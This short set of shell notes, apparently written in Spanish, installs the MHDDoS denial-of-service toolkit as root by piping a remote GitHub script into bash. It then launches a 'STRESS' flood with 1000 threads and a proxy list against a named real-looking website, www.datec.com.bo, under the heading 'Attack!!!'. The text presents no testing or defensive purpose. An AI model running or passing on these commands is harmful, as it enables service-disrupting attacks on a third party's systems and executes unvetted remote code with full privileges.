# COMO ROOT
sudo curl https://raw.githubusercontent.com/pedroflor/EH-PT-RT-Varios/master/setup-mhddos.sh | bash

# COMO usuario "ddos"
su - ddos
cd MHDDoS/
touch proxy.list

# Attack!!!
python3 /home/ddos/MHDDoSstart.py STRESS https://www.datec.com.bo/ 1 1000 proxy.list 1000 1200
